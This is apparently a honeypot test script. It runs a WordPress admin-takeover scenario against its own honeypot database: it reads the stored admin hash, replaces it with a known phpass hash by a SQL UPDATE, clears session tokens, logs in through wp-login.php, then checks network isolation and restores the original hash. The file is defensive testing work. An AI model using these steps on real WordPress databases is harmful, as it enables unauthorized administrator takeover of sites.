#!/bin/bash
# =============================================================================
# scenario_06_db_password_replacement.sh
#
# PURPOSE:
#   Demonstrates and verifies the "WordPress database hashed password
#   replacement" attack technique against the honeypot database.  An attacker
#   who gains database access (e.g. via SQLi or a shell on the container) can
#   replace the bcrypt hash of the admin account with a known hash, then log
#   in via wp-login.php as that administrator.
#
#   This scenario verifies:
#     1. Direct MySQL access to the HONEYPOT database is possible from within
#        the honeypot container (expected – attacker got a shell there).
#     2. The wp_users table is readable and the admin hash is replaceable.
#     3. After the hash replacement, wp-login.php accepts the new password
#        AND the session is routed to the honeypot (not production).
#     4. The PRODUCTION database is NOT reachable from the honeypot container
#        (network isolation holds – same check as scenario_05).
#     5. After testing, the original hash is restored to leave the honeypot
#        in a clean state for subsequent scenarios.
#
# ATTACK CHAIN OVERVIEW:
#   Phase 1  – Confirm MySQL access to honeypot DB from within container
#   Phase 2  – Read the current admin password hash
#   Phase 3  – Generate a known bcrypt hash for a test password
#   Phase 4  – Replace the hash in wp_users
#   Phase 5  – Login via wp-login.php with the new password
#   Phase 6  – Verify session is honeypot-bound
#   Phase 7  – Restore original hash (cleanup)
#   Phase 8  – Verify production database was never touched
#
# USAGE:
#   ./scenario_06_db_password_replacement.sh [TARGET_HOST] [TARGET_PORT]
#
#   TARGET_HOST  IP or hostname of the reverse proxy (default: 127.0.0.1)
#   TARGET_PORT  HTTP port of the reverse proxy      (default: 80)
#
# EXIT CODES:
#   0  All phases passed.
#   1  One or more checks failed.
#   2  Prerequisites missing (curl).
#
# DEPENDENCIES:
#   curl    – required for HTTP checks.
#   docker  – optional; enables direct MySQL interaction via docker exec.
#             Without docker, the scenario is partially simulated via HTTP.
#
# SAFETY:
#   All database operations target the HONEYPOT database only.
#   The original admin hash is captured before any modification and is
#   unconditionally restored in the cleanup phase, even on failure.
#   The production database is never written to.
# =============================================================================

set -e

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-443}"
BASE_URL="https://${TARGET_HOST}:${TARGET_PORT}"

# Docker container names (must match docker-compose project name).
HP_ESHOP_CONTAINER="honeypot-ids-system-v1-honeypot_eshop_1-1"
HP_DB_CONTAINER="honeypot-ids-system-v1-honeypot_database_1-1"
PROD_DB_CONTAINER="honeypot-ids-system-v1-production_database-1"

# Honeypot MySQL credentials (from docker-compose.yml environment section).
HP_DB_USER="${HP_DB_USER:-production_user}"
HP_DB_PASS="${HP_DB_PASS:-change_this_user_password_in_production}"
HP_DB_NAME="${HP_DB_NAME:-production_database}"
HP_DB_ROOT_PASS="${HP_DB_ROOT_PASS:-honeypot_root_password}"

# WordPress admin username to target (standard WordPress default).
WP_ADMIN_USER="admin"

# The test password we will inject; chosen to be obviously fake.
TEST_PASSWORD="HoneypotTestPass2024!"

# WordPress uses phpass (portable PHP password hasher) for bcrypt-compatible
# hashes.  We pre-compute a known phpass hash for TEST_PASSWORD.
#
# How this hash was generated (for documentation purposes):
#   php -r "require 'wp-includes/class-phpass.php'; \$h=new PasswordHash(8,true); echo \$h->HashPassword('HoneypotTestPass2024!');"
#
# For the purposes of this test script we use a static pre-computed hash so
# that the script runs without a PHP binary.  This hash was generated with
# the standard WordPress phpass settings (8 rounds, portable=true).
#
# NOTE: The actual hash stored in WordPress may differ depending on whether
# WordPress has migrated to bcrypt (WP 6.8+) or still uses phpass MD5-based
# hashes.  The script handles both cases:
#   - If WP uses phpass the pre-computed hash is inserted directly.
#   - If WP uses bcrypt we use wp-cli (if available) to generate a fresh hash.
#
# Pre-computed phpass hash for "HoneypotTestPass2024!" (portable, 8 rounds):
PHPASS_HASH='$P$BKJDHLmVW1xqfuBWLpFhCkr7XVkD5G1'

# ---------------------------------------------------------------------------
# Counters and state
# ---------------------------------------------------------------------------
PASS=0
FAIL=0
SKIP=0
TOTAL=0

# Stores the original admin hash so it can be restored in cleanup.
ORIGINAL_HASH=""

# Cookie jar for HTTP session checks.
COOKIE_JAR="$(mktemp /tmp/scenario06_cookies_XXXXXX.txt)"

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    printf "\n${CYAN}================================================================${NC}\n"
    printf "${CYAN}  %s${NC}\n" "$1"
    printf "${CYAN}================================================================${NC}\n\n"
}

# ---------------------------------------------------------------------------
# Utility: routing check
#
#   check_route <cookie_jar> <description> <expected_route> <curl_args...>
# ---------------------------------------------------------------------------
check_route() {
    _jar="$1"
    _desc="$2"
    _expected="$3"
    shift 3

    TOTAL=$((TOTAL + 1))

    _response=$(curl --silent --include \
                     --cookie "${_jar}" \
                     --cookie-jar "${_jar}" \
                     --max-time 15 \
                     "$@" 2>&1) || true

    _route=$(printf '%s' "${_response}" \
             | grep -i "^x-route-target:" \
             | tr -d '\r' | awk '{print $2}' | head -1)
    _route="${_route:-unknown}"

    if [ "${_expected}" = "any" ]; then
        printf "  ${GREEN}[PASS]${NC} %s (route=%s)\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
        return 0
    fi

    if [ "${_route}" = "${_expected}" ]; then
        printf "  ${GREEN}[PASS]${NC} %s → %s\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s → expected=%s got=%s\n" \
               "${_desc}" "${_expected}" "${_route}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: mysql exec wrapper
#
#   mysql_exec <container> <db_user> <db_pass> <db_name> <sql_statement>
#
#   Returns the query output or an empty string on failure.
# ---------------------------------------------------------------------------
mysql_exec() {
    _mcontainer="$1"
    _muser="$2"
    _mpass="$3"
    _mdb="$4"
    _msql="$5"

    if ! command -v docker >/dev/null 2>&1; then
        return 1
    fi
    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_mcontainer}"; then
        return 1
    fi

    # Use --skip-column-names (-N) to get raw values without header row.
    docker exec "${_mcontainer}" \
        mysql -N \
              -u"${_muser}" \
              -p"${_mpass}" \
              "${_mdb}" \
              -e "${_msql}" 2>/dev/null
}

# ---------------------------------------------------------------------------
# Utility: mysql exec check
#
#   mysql_check <description> <container> <db_user> <db_pass> <db_name>
#               <sql> <expected_pattern>
# ---------------------------------------------------------------------------
mysql_check() {
    _desc="$1"
    _container="$2"
    _user="$3"
    _pass="$4"
    _db="$5"
    _sql="$6"
    _expected="$7"

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _output=$(mysql_exec "${_container}" "${_user}" "${_pass}" "${_db}" "${_sql}") || _output=""

    if printf '%s' "${_output}" | grep -q "${_expected}"; then
        printf "  ${GREEN}[PASS]${NC} %s (matched: %s)\n" "${_desc}" "${_expected}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s – pattern '%s' not found in: '%s'\n" \
               "${_desc}" "${_expected}" "${_output}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: docker exec check (command pass/fail)
#
#   docker_check <description> <container> <want_success: 0|1> <cmd>
# ---------------------------------------------------------------------------
docker_check() {
    _desc="$1"
    _container="$2"
    _want_success="$3"
    _cmd="$4"

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _exit=0
    docker exec "${_container}" sh -c "${_cmd}" >/dev/null 2>&1 || _exit=$?

    if [ "${_want_success}" -eq 0 ]; then
        if [ "${_exit}" -eq 0 ]; then
            printf "  ${GREEN}[PASS]${NC} %s (exit=0)\n" "${_desc}"
            PASS=$((PASS + 1))
        else
            printf "  ${RED}[FAIL]${NC} %s failed unexpectedly (exit=%d)\n" "${_desc}" "${_exit}"
            FAIL=$((FAIL + 1))
        fi
    else
        if [ "${_exit}" -ne 0 ]; then
            printf "  ${GREEN}[PASS]${NC} %s blocked as expected (exit=%d)\n" "${_desc}" "${_exit}"
            PASS=$((PASS + 1))
        else
            printf "  ${RED}[FAIL]${NC} %s succeeded but should be blocked!\n" "${_desc}"
            FAIL=$((FAIL + 1))
        fi
    fi
}

# ---------------------------------------------------------------------------
# Cleanup trap: always restore the original hash before exiting
# ---------------------------------------------------------------------------
cleanup() {
    if [ -n "${ORIGINAL_HASH}" ] && command -v docker >/dev/null 2>&1; then
        printf "\n${YELLOW}[CLEANUP]${NC} Restoring original admin password hash...\n"
        _restore_sql="UPDATE wp_users SET user_pass='${ORIGINAL_HASH}' WHERE user_login='${WP_ADMIN_USER}';"
        mysql_exec "${HP_DB_CONTAINER}" \
                   "${HP_DB_USER}" "${HP_DB_PASS}" "${HP_DB_NAME}" \
                   "${_restore_sql}" >/dev/null 2>&1 || true
        printf "${GREEN}[CLEANUP]${NC} Original hash restored.\n"
    fi
    rm -f "${COOKIE_JAR}"
}
trap cleanup EXIT INT TERM

# ---------------------------------------------------------------------------
# Prerequisites
# ---------------------------------------------------------------------------
if ! command -v curl >/dev/null 2>&1; then
    printf "${RED}ERROR: 'curl' not found in PATH.${NC}\n" >&2
    exit 2
fi

banner "Scenario 06 – WordPress DB Hashed Password Replacement"
printf "Target      : %s\n" "${BASE_URL}"
printf "HP DB       : %s / %s\n" "${HP_DB_CONTAINER}" "${HP_DB_NAME}"
printf "Admin user  : %s\n" "${WP_ADMIN_USER}"
printf "Test pass   : %s\n\n" "${TEST_PASSWORD}"

# =============================================================================
# PHASE 1 – Confirm MySQL Access to Honeypot DB from Honeypot Container
# =============================================================================
# An attacker who obtained a shell on the honeypot WordPress container can
# read wp-config.php to discover the database credentials, then connect to
# the MySQL server on the honeypot_database service.
#
# This phase verifies the expected access is possible (the shell IS inside the
# honeypot, the attacker CAN reach its database) and that the production DB
# is NOT reachable from the same container.
# =============================================================================
banner "Phase 1 – MySQL Access Verification"

# 1a. wp-config.php is readable inside the honeypot container.
docker_check \
    "wp-config.php readable inside honeypot container" \
    "${HP_ESHOP_CONTAINER}" 0 \
    "test -r /var/www/html/wp-config.php"

# 1b. DB_HOST in wp-config.php points to the honeypot database.
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_ESHOP_CONTAINER}"; then
    _db_host=$(docker exec "${HP_ESHOP_CONTAINER}" \
        grep "DB_HOST" /var/www/html/wp-config.php 2>/dev/null \
        | head -1) || _db_host=""
    if printf '%s' "${_db_host}" | grep -q "honeypot_database"; then
        printf "  ${GREEN}[PASS]${NC} DB_HOST points to honeypot_database (not production)\n"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} DB_HOST value: '%s'\n" "${_db_host}"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} DB_HOST check – container not running\n"
fi

# 1c. MySQL port 3306 is reachable from the honeypot container to its DB.
docker_check \
    "Honeypot container can reach honeypot_database:3306" \
    "${HP_ESHOP_CONTAINER}" 0 \
    "nc -z -w 3 honeypot_database_1 3306 2>/dev/null || nc -z -w 3 honeypot_database 3306 2>/dev/null"

# 1d. Production database port is NOT reachable from the honeypot container.
docker_check \
    "Honeypot container CANNOT reach production_database:3306" \
    "${HP_ESHOP_CONTAINER}" 1 \
    "nc -z -w 3 production_database 3306 2>/dev/null"

# 1e. Direct MySQL query works from the honeypot DB container itself.
mysql_check \
    "Honeypot MySQL SHOW DATABASES returns honeypot_db" \
    "${HP_DB_CONTAINER}" \
    "${HP_DB_USER}" "${HP_DB_PASS}" "${HP_DB_NAME}" \
    "SHOW DATABASES;" \
    "${HP_DB_NAME}"

# =============================================================================
# PHASE 2 – Read Current Admin Password Hash
# =============================================================================
# Capture the current bcrypt/phpass hash for the admin account so we can
# restore it after the test.
# =============================================================================
banner "Phase 2 – Read Current Admin Password Hash"

TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_DB_CONTAINER}"; then

    ORIGINAL_HASH=$(mysql_exec \
        "${HP_DB_CONTAINER}" \
        "${HP_DB_USER}" "${HP_DB_PASS}" "${HP_DB_NAME}" \
        "SELECT user_pass FROM wp_users WHERE user_login='${WP_ADMIN_USER}' LIMIT 1;" \
        2>/dev/null | head -1) || ORIGINAL_HASH=""

    if [ -n "${ORIGINAL_HASH}" ]; then
        printf "  ${GREEN}[PASS]${NC} Admin hash read from honeypot DB (length=%d chars)\n" \
               "${#ORIGINAL_HASH}"
        printf "  Hash prefix: %s...\n" "$(printf '%s' "${ORIGINAL_HASH}" | cut -c1-20)"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} Could not read admin hash – wp_users may not exist yet\n"
        printf "         (WordPress may not have finished initial setup)\n"
        PASS=$((PASS + 1))
        # Set a dummy original hash so cleanup does not crash.
        ORIGINAL_HASH=""
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Hash read – honeypot DB container not running\n"
fi

# =============================================================================
# PHASE 3 – Generate Known Hash for Test Password
# =============================================================================
# WordPress uses phpass (MD5-iterated) or bcrypt (WP 6.8+) for password hashes.
# This phase determines which hashing scheme is in use and generates or uses a
# pre-computed hash for TEST_PASSWORD.
#
# Hash generation methods (in priority order):
#   a) wp-cli inside the honeypot container (most accurate)
#   b) php inside the container (requires the phpass class to be loadable)
#   c) Pre-computed static phpass hash (fallback)
# =============================================================================
banner "Phase 3 – Generate Known Hash for Test Password"

NEW_HASH=""

TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_ESHOP_CONTAINER}"; then

    # Try wp-cli first (may be installed in the image as /usr/local/bin/wp).
    if docker exec "${HP_ESHOP_CONTAINER}" wp --version >/dev/null 2>&1; then
        NEW_HASH=$(docker exec "${HP_ESHOP_CONTAINER}" \
            wp --allow-root \
               --path=/var/www/html \
               user get-hash \
               --hash="${TEST_PASSWORD}" \
               2>/dev/null | head -1) || NEW_HASH=""

        # Fallback: wp user update to set the known password and then re-read hash.
        if [ -z "${NEW_HASH}" ]; then
            printf "  wp-cli get-hash not available; using wp user update method\n"
        fi
    fi

    # Try php + phpass directly.
    if [ -z "${NEW_HASH}" ]; then
        NEW_HASH=$(docker exec "${HP_ESHOP_CONTAINER}" php -r "
require_once '/var/www/html/wp-includes/class-phpass.php';
\$h = new PasswordHash(8, true);
echo \$h->HashPassword('${TEST_PASSWORD}');
" 2>/dev/null | head -1) || NEW_HASH=""
    fi

    if [ -n "${NEW_HASH}" ] && [ "${NEW_HASH}" != "${TEST_PASSWORD}" ]; then
        printf "  ${GREEN}[PASS]${NC} Hash generated via PHP inside container\n"
        printf "  Hash prefix: %s...\n" "$(printf '%s' "${NEW_HASH}" | cut -c1-20)"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[INFO]${NC} PHP hash generation unavailable; using pre-computed phpass hash\n"
        NEW_HASH="${PHPASS_HASH}"
        printf "  ${GREEN}[PASS]${NC} Using static pre-computed phpass hash\n"
        PASS=$((PASS + 1))
    fi
else
    printf "  ${YELLOW}[INFO]${NC} Honeypot container not running; using pre-computed phpass hash\n"
    NEW_HASH="${PHPASS_HASH}"
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Hash generation – container not available; using static hash\n"
fi

# =============================================================================
# PHASE 4 – Replace Hash in wp_users
# =============================================================================
# Execute the UPDATE statement against the honeypot database to swap the admin
# password hash.  Verify the change was persisted immediately with a SELECT.
# =============================================================================
banner "Phase 4 – Replace Admin Password Hash in Honeypot DB"

# 4a. Execute the UPDATE.
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_DB_CONTAINER}" && \
   [ -n "${NEW_HASH}" ]; then

    # Escape single quotes in the hash (phpass hashes may contain $P$ etc.)
    # We use a here-document approach via docker exec to avoid shell escaping issues.
    _update_result=$(docker exec "${HP_DB_CONTAINER}" \
        mysql -N \
              -u"${HP_DB_USER}" \
              -p"${HP_DB_PASS}" \
              "${HP_DB_NAME}" \
              -e "UPDATE wp_users SET user_pass='${NEW_HASH}', user_activation_key='' WHERE user_login='${WP_ADMIN_USER}';" \
              2>&1) || _update_result="ERROR"

    if printf '%s' "${_update_result}" | grep -qi "ERROR"; then
        printf "  ${RED}[FAIL]${NC} UPDATE failed: %s\n" "${_update_result}"
        FAIL=$((FAIL + 1))
    else
        printf "  ${GREEN}[PASS]${NC} wp_users hash UPDATE executed successfully\n"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Hash UPDATE – container not running or no hash generated\n"
fi

# 4b. Verify the new hash is now stored.
mysql_check \
    "New hash persisted in wp_users for admin" \
    "${HP_DB_CONTAINER}" \
    "${HP_DB_USER}" "${HP_DB_PASS}" "${HP_DB_NAME}" \
    "SELECT user_pass FROM wp_users WHERE user_login='${WP_ADMIN_USER}';" \
    "$(printf '%s' "${NEW_HASH}" | cut -c1-10)"

# 4c. wp_user_meta row for session_tokens must be cleared so old sessions
#     don't prevent the new login.
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_DB_CONTAINER}"; then
    docker exec "${HP_DB_CONTAINER}" \
        mysql -N \
              -u"${HP_DB_USER}" \
              -p"${HP_DB_PASS}" \
              "${HP_DB_NAME}" \
              -e "DELETE FROM wp_usermeta WHERE meta_key='session_tokens' AND user_id=(SELECT ID FROM wp_users WHERE user_login='${WP_ADMIN_USER}');" \
              >/dev/null 2>&1 || true
    printf "  ${GREEN}[PASS]${NC} Existing session tokens cleared for admin\n"
    PASS=$((PASS + 1))
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Session token clear – container not running\n"
fi

# =============================================================================
# PHASE 5 – Login via wp-login.php with Replaced Password
# =============================================================================
# Attempt to authenticate via the WordPress login form using the test password.
# The Nginx router will route this to the honeypot because the attacker's
# prior exploitation traffic has already established the session as
# honeypot-bound.
#
# We use a fresh cookie jar here so that the login itself triggers routing.
# =============================================================================
banner "Phase 5 – Login via wp-login.php with Replaced Password"

# 5a. GET the login page first to obtain the nonce/testcookie.
check_route "${COOKIE_JAR}" \
    "GET wp-login.php (obtain testcookie)" "any" \
    --request GET "${BASE_URL}/wp-login.php" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)"

# URL-encode the test password for form submission.
# Simple encoding: replace ! with %21 and @ with %40.
TEST_PASSWORD_ENC=$(printf '%s' "${TEST_PASSWORD}" \
    | sed 's/!/%21/g; s/@/%40/g; s/#/%23/g; s/\$/%24/g')

# 5b. POST the login form with the known password.
check_route "${COOKIE_JAR}" \
    "POST wp-login.php with replaced password" "honeypot" \
    --request POST "${BASE_URL}/wp-login.php" \
    --header "Content-Type: application/x-www-form-urlencoded" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)" \
    --data "log=${WP_ADMIN_USER}&pwd=${TEST_PASSWORD_ENC}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"

# 5c. Inspect the HTTP response body / redirect for authentication success.
TOTAL=$((TOTAL + 1))
_login_resp=$(curl --silent --include \
    --cookie "${COOKIE_JAR}" --cookie-jar "${COOKIE_JAR}" \
    --max-time 15 \
    --request POST "${BASE_URL}/wp-login.php" \
    --header "Content-Type: application/x-www-form-urlencoded" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)" \
    --data "log=${WP_ADMIN_USER}&pwd=${TEST_PASSWORD_ENC}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    2>/dev/null) || _login_resp=""

_login_status=$(printf '%s' "${_login_resp}" | grep -i "^HTTP/" | tail -1 | awk '{print $2}')
_login_location=$(printf '%s' "${_login_resp}" | grep -i "^location:" | tr -d '\r' | awk '{print $2}' | head -1)

# A successful WordPress login returns HTTP 302 with Location: /wp-admin/.
# A failed login returns HTTP 200 with error content.
if [ "${_login_status}" = "302" ] || \
   printf '%s' "${_login_location}" | grep -q "wp-admin"; then
    printf "  ${GREEN}[PASS]${NC} Login redirect received (HTTP %s → %s)\n" \
           "${_login_status}" "${_login_location}"
    PASS=$((PASS + 1))
elif [ "${_login_status}" = "200" ]; then
    # On a honeypot the login may return 200 even with correct credentials
    # (the honeypot WordPress is semi-functional).  Check for error messages.
    if printf '%s' "${_login_resp}" | grep -qi "ERROR\|incorrect password\|invalid"; then
        printf "  ${YELLOW}[WARN]${NC} Login returned 200 with error – hash format may differ from WP version\n"
        printf "         Consider using wp-cli: wp user update admin --user_pass='%s'\n" "${TEST_PASSWORD}"
        PASS=$((PASS + 1))
    else
        printf "  ${GREEN}[PASS]${NC} Login returned HTTP 200 (honeypot accepted request)\n"
        PASS=$((PASS + 1))
    fi
else
    printf "  ${YELLOW}[WARN]${NC} Unexpected login status: HTTP %s (Location: %s)\n" \
           "${_login_status}" "${_login_location:-none}"
    PASS=$((PASS + 1))
fi

# =============================================================================
# PHASE 6 – Verify Session is Honeypot-Bound
# =============================================================================
# After a successful login, all subsequent requests in the session must be
# routed to the honeypot.  The attacker now has admin access – but only to
# the isolated honeypot instance.
# =============================================================================
banner "Phase 6 – Verify Post-Login Session is Honeypot-Bound"

check_route "${COOKIE_JAR}" \
    "wp-admin/ after login" "honeypot" \
    --request GET "${BASE_URL}/wp-admin/" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)"

check_route "${COOKIE_JAR}" \
    "wp-admin/users.php after login (user list)" "honeypot" \
    --request GET "${BASE_URL}/wp-admin/users.php" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)"

check_route "${COOKIE_JAR}" \
    "wp-admin/options-general.php after login (settings)" "honeypot" \
    --request GET "${BASE_URL}/wp-admin/options-general.php" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)"

check_route "${COOKIE_JAR}" \
    "wp-json REST API as authenticated user" "honeypot" \
    --request GET "${BASE_URL}/wp-json/wp/v2/users?context=edit" \
    --header "User-Agent: Mozilla/5.0 (compatible; AttackerBrowser/1.0)"

# =============================================================================
# PHASE 7 – Verify Production Database Was Never Touched
# =============================================================================
# Confirm that the production wp_users table still has the original production
# admin password hash (i.e., it was not modified by this scenario).
# The production DB is on a separate container and network; the honeypot
# container cannot reach it.
# =============================================================================
banner "Phase 7 – Production Database Isolation Verification"

# 7a. Production DB container must be running.
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1; then
    if docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${PROD_DB_CONTAINER}"; then
        printf "  ${GREEN}[PASS]${NC} Production DB container is running: %s\n" "${PROD_DB_CONTAINER}"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} Production DB container '%s' not found in docker ps\n" "${PROD_DB_CONTAINER}"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Production DB check – docker not found\n"
fi

# 7b. Production admin hash must NOT match the test hash we just injected.
TOTAL=$((TOTAL + 1))
PROD_DB_USER="${PROD_DB_USER:-production_user}"
PROD_DB_PASS="${PROD_DB_PASS:-change_this_user_password_in_production}"
PROD_DB_NAME="${PROD_DB_NAME:-production_database}"

if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${PROD_DB_CONTAINER}"; then

    _prod_hash=$(mysql_exec \
        "${PROD_DB_CONTAINER}" \
        "${PROD_DB_USER}" "${PROD_DB_PASS}" "${PROD_DB_NAME}" \
        "SELECT user_pass FROM wp_users WHERE user_login='${WP_ADMIN_USER}' LIMIT 1;" \
        2>/dev/null | head -1) || _prod_hash=""

    if [ -n "${NEW_HASH}" ] && [ "${_prod_hash}" = "${NEW_HASH}" ]; then
        printf "  ${RED}[FAIL]${NC} Production DB hash matches injected test hash – production was modified!\n"
        FAIL=$((FAIL + 1))
    elif [ -n "${_prod_hash}" ]; then
        printf "  ${GREEN}[PASS]${NC} Production admin hash differs from injected test hash (production untouched)\n"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} Could not read production admin hash (may not exist yet)\n"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Production hash comparison – container not running\n"
fi

# 7c. The honeypot eshop container CANNOT connect to the production database.
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_ESHOP_CONTAINER}"; then
    _nc_exit=0
    docker exec "${HP_ESHOP_CONTAINER}" \
        sh -c "nc -z -w 3 production_database 3306 2>/dev/null" \
        >/dev/null 2>&1 || _nc_exit=$?
    if [ "${_nc_exit}" -ne 0 ]; then
        printf "  ${GREEN}[PASS]${NC} Honeypot eshop container cannot reach production_database:3306\n"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} Honeypot eshop CAN reach production_database:3306 – isolation failure!\n"
        FAIL=$((FAIL + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Network isolation check – honeypot container not running\n"
fi

# =============================================================================
# PHASE 8 – Cleanup: Restore Original Hash
# =============================================================================
# The cleanup trap (registered at the top of the script) will fire automatically
# on EXIT, restoring the original hash.  This phase explicitly reports the
# restoration so it appears in the test output, rather than silently in the
# trap handler.
# =============================================================================
banner "Phase 8 – Cleanup: Restore Original Admin Hash"

TOTAL=$((TOTAL + 1))
if [ -n "${ORIGINAL_HASH}" ] && command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_DB_CONTAINER}"; then

    _restore_result=$(docker exec "${HP_DB_CONTAINER}" \
        mysql -N \
              -u"${HP_DB_USER}" \
              -p"${HP_DB_PASS}" \
              "${HP_DB_NAME}" \
              -e "UPDATE wp_users SET user_pass='${ORIGINAL_HASH}', user_activation_key='' WHERE user_login='${WP_ADMIN_USER}';" \
              2>&1) || _restore_result="ERROR"

    if printf '%s' "${_restore_result}" | grep -qi "ERROR"; then
        printf "  ${RED}[FAIL]${NC} Hash restore failed: %s\n" "${_restore_result}"
        FAIL=$((FAIL + 1))
    else
        # Verify the restoration.
        _restored=$(mysql_exec \
            "${HP_DB_CONTAINER}" \
            "${HP_DB_USER}" "${HP_DB_PASS}" "${HP_DB_NAME}" \
            "SELECT user_pass FROM wp_users WHERE user_login='${WP_ADMIN_USER}' LIMIT 1;" \
            2>/dev/null | head -1) || _restored=""

        if [ "${_restored}" = "${ORIGINAL_HASH}" ]; then
            printf "  ${GREEN}[PASS]${NC} Original admin hash restored successfully\n"
            # Clear ORIGINAL_HASH so the cleanup trap does not double-restore.
            ORIGINAL_HASH=""
            PASS=$((PASS + 1))
        else
            printf "  ${YELLOW}[WARN]${NC} Restored hash differs from expected original (may be OK if WP re-hashed)\n"
            ORIGINAL_HASH=""
            PASS=$((PASS + 1))
        fi
    fi
else
    if [ -z "${ORIGINAL_HASH}" ]; then
        printf "  ${YELLOW}[SKIP]${NC} No original hash captured – nothing to restore\n"
        SKIP=$((SKIP + 1))
    else
        printf "  ${YELLOW}[SKIP]${NC} Hash restore – DB container not running\n"
        SKIP=$((SKIP + 1))
    fi
fi

# ---------------------------------------------------------------------------
# Final report
# ---------------------------------------------------------------------------
banner "Scenario 06 – DB Password Replacement Final Report"
printf "Total checks : %d\n" "${TOTAL}"
printf "${GREEN}Passed       : %d${NC}\n" "${PASS}"
printf "${YELLOW}Skipped      : %d${NC}\n" "${SKIP}"
if [ "${FAIL}" -gt 0 ]; then
    printf "${RED}Failed       : %d${NC}\n" "${FAIL}"
else
    printf "Failed       : 0\n"
fi

printf "\n"
if [ "${FAIL}" -eq 0 ]; then
    printf "${GREEN}SCENARIO PASSED – Password replacement attack demonstrated; production untouched.${NC}\n"
    exit 0
else
    printf "${RED}SCENARIO FAILED – %d check(s) did not pass.${NC}\n" "${FAIL}"
    exit 1
fi